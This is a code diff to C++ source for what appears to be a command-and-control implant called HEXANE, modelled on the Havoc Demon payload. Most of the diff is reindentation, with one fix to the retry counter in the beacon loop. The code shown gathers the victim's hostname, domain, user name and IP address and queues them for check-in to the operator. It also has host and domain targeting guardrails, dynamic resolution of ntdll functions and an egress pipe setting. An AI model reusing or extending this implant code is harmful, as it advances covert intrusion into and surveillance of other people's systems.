@@ -11,7 +11,7 @@ using namespace Memory::Context;
 // TODO: consider hash-tables for API struct
 namespace Main {
     UINT8
-    __attribute__((used, section(".data"))) Config[CONFIG_SIZE] = { 0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa, };
+        __attribute__((used, section(".data"))) Config[CONFIG_SIZE] = { 0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa, };
 
     VOID MainRoutine() {
         HEXANE;
@@ -34,11 +34,11 @@ namespace Main {
             }
 
             if (!DispatchRoutine()) {
-                ctx->session.retries++;
+                retry++;
+
                 if (retry == ctx->session.retries) {
                     break;
                 }
-
                 continue;
             }
 
@@ -48,116 +48,116 @@ namespace Main {
         ContextDestroy();
     }
 
-  BOOL EnumSystem() {
-    // resolve version : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
-    HEXANE;
+    BOOL EnumSystem() {
+        // resolve version : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
+        HEXANE;
 
-    _stream *out = CreateStreamWithHeaders(TypeCheckin);
+        _stream *out = CreateStreamWithHeaders(TypeCheckin);
 
-    IP_ADAPTER_INFO adapter     = { };
-    OSVERSIONINFOW os_version   = { };
-    BOOL success = false;
+        IP_ADAPTER_INFO adapter     = { };
+        OSVERSIONINFOW os_version   = { };
+        BOOL success = false;
 
-    DWORD name_len = MAX_PATH;
-    CHAR buffer[MAX_PATH] = { };
+        DWORD name_len = MAX_PATH;
+        CHAR buffer[MAX_PATH] = { };
 
-    PROCESSENTRY32 proc_entry   = { };
-    proc_entry.dwSize           = sizeof(PROCESSENTRY32);
+        PROCESSENTRY32 proc_entry   = { };
+        proc_entry.dwSize           = sizeof(PROCESSENTRY32);
 
-    HANDLE snap = ctx->win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snap == INVALID_HANDLE_VALUE) {
-        goto defer;
-    }
+        HANDLE snap = ctx->win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (snap == INVALID_HANDLE_VALUE) {
+            goto defer;
+        }
 
-    x_ntassertb(ctx->win32.RtlGetVersion(&os_version));
+        x_ntassertb(ctx->win32.RtlGetVersion(&os_version));
 
-    ctx->session.version = WIN_VERSION_UNKNOWN;
-    os_version.dwOSVersionInfoSize = sizeof(os_version);
+        ctx->session.version = WIN_VERSION_UNKNOWN;
+        os_version.dwOSVersionInfoSize = sizeof(os_version);
 
-    if (os_version.dwMajorVersion >= 5) {
-        if (os_version.dwMajorVersion == 5) {
-            if (os_version.dwMinorVersion == 1) {
-                        ctx->session.version = WIN_VERSION_XP;
+        if (os_version.dwMajorVersion >= 5) {
+            if (os_version.dwMajorVersion == 5) {
+                if (os_version.dwMinorVersion == 1) {
+                    ctx->session.version = WIN_VERSION_XP;
+                }
             }
-      }
-      else if (os_version.dwMajorVersion == 6) {
-        if (os_version.dwMinorVersion == 0) {
-            ctx->session.version = WIN_VERSION_2008;
-        }
-        else if (os_version.dwMinorVersion == 1) {
-            ctx->session.version = WIN_VERSION_2008_R2;
-        }
-        else if (os_version.dwMinorVersion == 2) {
-            ctx->session.version = WIN_VERSION_2012;
-        }
-        else if (os_version.dwMinorVersion == 3) {
-            ctx->session.version = WIN_VERSION_2012_R2;
-        }
-      } else if (os_version.dwMajorVersion == 10) {
-            if (os_version.dwMinorVersion == 0) {
-                ctx->session.version = WIN_VERSION_2016_X;
-            }
-        }
-    }
-
-    if (ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, (LPSTR) buffer, &name_len)) {
-        if (ctx->config.hostname[0]) {
-            if (MbsBoundCompare(buffer, ctx->config.hostname, MbsLength(ctx->config.hostname)) != 0) {
-                // LOG ERROR (bad host)
-                success = true;
-                goto defer;
+            else if (os_version.dwMajorVersion == 6) {
+                if (os_version.dwMinorVersion == 0) {
+                    ctx->session.version = WIN_VERSION_2008;
+                }
+                else if (os_version.dwMinorVersion == 1) {
+                    ctx->session.version = WIN_VERSION_2008_R2;
+                }
+                else if (os_version.dwMinorVersion == 2) {
+                    ctx->session.version = WIN_VERSION_2012;
+                }
+                else if (os_version.dwMinorVersion == 3) {
+                    ctx->session.version = WIN_VERSION_2012_R2;
+                }
+            } else if (os_version.dwMajorVersion == 10) {
+                if (os_version.dwMinorVersion == 0) {
+                    ctx->session.version = WIN_VERSION_2016_X;
+                }
             }
         }
-        PackString(out, buffer);
-    }
-    else {
-        PackUint32(out, 0);
-    }
 
-    MemSet(buffer, 0, MAX_PATH);
-    name_len = MAX_PATH;
-
-    if (ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, (LPSTR) buffer, &name_len)) {
-        if (ctx->transport.domain[0]) {
-            if (MbsBoundCompare(ctx->transport.domain, buffer, MbsLength(ctx->transport.domain)) != 0) {
-                // LOG ERROR (bad domain)
-                success = true;
-                goto defer;
+        if (ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, (LPSTR) buffer, &name_len)) {
+            if (ctx->config.hostname[0]) {
+                if (MbsBoundCompare(buffer, ctx->config.hostname, MbsLength(ctx->config.hostname)) != 0) {
+                    // LOG ERROR (bad host)
+                    success = true;
+                    goto defer;
+                }
             }
+            PackString(out, buffer);
         }
-        PackString(out, buffer);
-    }
-    else {
-        PackUint32(out, 0);
-    }
+        else {
+            PackUint32(out, 0);
+        }
 
-    MemSet(buffer, 0, MAX_PATH);
-    name_len = MAX_PATH;
+        MemSet(buffer, 0, MAX_PATH);
+        name_len = MAX_PATH;
 
-    if (ctx->win32.GetUserNameA((LPSTR) buffer, &name_len)) {
-        PackString(out, buffer);
+        if (ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, (LPSTR) buffer, &name_len)) {
+            if (ctx->transport.domain[0]) {
+                if (MbsBoundCompare(ctx->transport.domain, buffer, MbsLength(ctx->transport.domain)) != 0) {
+                    // LOG ERROR (bad domain)
+                    success = true;
+                    goto defer;
+                }
+            }
+            PackString(out, buffer);
+        }
+        else {
+            PackUint32(out, 0);
+        }
+
+        MemSet(buffer, 0, MAX_PATH);
+        name_len = MAX_PATH;
+
+        if (ctx->win32.GetUserNameA((LPSTR) buffer, &name_len)) {
+            PackString(out, buffer);
+        }
+        else {
+            PackUint32(out, 0);
+        }
+
+        MemSet(buffer, 0, MAX_PATH);
+        name_len = sizeof(IP_ADAPTER_INFO);
+
+        if (ctx->win32.GetAdaptersInfo(&adapter, &name_len) == NO_ERROR) {
+            PackString(out, adapter.IpAddressList.IpAddress.String);
+        }
+        else {
+            PackUint32(out, 0);
+        }
+
+        MemSet(&adapter, 0, sizeof(IP_ADAPTER_INFO));
+        success = true;
+
+        defer:
+        success ? MessageQueue(out) : DestroyStream(out);
+        return success;
     }
-    else {
-        PackUint32(out, 0);
-    }
-
-    MemSet(buffer, 0, MAX_PATH);
-    name_len = sizeof(IP_ADAPTER_INFO);
-
-    if (ctx->win32.GetAdaptersInfo(&adapter, &name_len) == NO_ERROR) {
-        PackString(out, adapter.IpAddressList.IpAddress.String);
-    }
-    else {
-        PackUint32(out, 0);
-    }
-
-    MemSet(&adapter, 0, sizeof(IP_ADAPTER_INFO));
-    success = true;
-
-  defer:
-    success ? MessageQueue(out) : DestroyStream(out);
-    return success;
-  }
 
     BOOL ResolveApi() {
         // TODO: create separate ResolveApi for loader and payload
@@ -321,7 +321,7 @@ namespace Main {
 		x_assertb(F_PTR_HMOD(ctx->win32.NtClose, 								ctx->modules.ntdll, NTCLOSE));
 #pragma endregion
 
-	defer:
+        defer:
 		return success;
 	}
 
@@ -386,7 +386,7 @@ namespace Main {
         ParserWcscpy(&parser, &ctx->transport.egress_pipe, nullptr);
 #endif
 
-    defer:
+        defer:
         DestroyParser(&parser);
         return success;
     }
